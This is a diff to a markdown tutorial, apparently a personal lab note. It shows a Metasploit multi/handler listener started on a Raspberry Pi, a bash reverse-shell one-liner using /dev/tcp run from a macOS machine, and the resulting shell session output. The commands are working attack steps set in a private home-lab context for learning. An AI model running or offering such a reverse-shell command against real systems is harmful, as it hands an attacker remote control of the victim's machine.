@@ -170,7 +170,37 @@ msf6 exploit(multi/handler) > set LHOST 192.168.0.1
 
 # start multi/handler
 msf6 exploit(multi/handler) > run
+[*] Started reverse TCP handler on 192.168.0.1:4444
 ```
 
+...
+
+### Wait or test for connection
+
+...
+
+```shell
+pi@raspberrypi:~ $ ss -tl | grep 4444
+LISTEN   0        256          192.168.0.1:4444                  0.0.0.0:* 
+```
+
+...
+
+```shell
+┌──[lupin@macOS]::[~]
+└─ % /bin/bash -c "/bin/bash -i >& /dev/tcp/192.168.0.1/4444 0>&1"
+```
+
+...
+
+```shell
+[*] Command shell session 4 opened (192.168.0.1:4444 -> 192.168.0.140:54247) at 2021-04-04 17:54:08 +0100
+ifconfig en0
+en0: flags=8863<UP,BROADCAST,SMART,RUNNING,SIMPLEX,MULTICAST> mtu 1500
+	...
+	inet 192.168.0.140 netmask 0xffffff00 broadcast 192.168.0.255
+	...
+bash-3.2$ exit
+```
 
 [Go Back](./README.md)
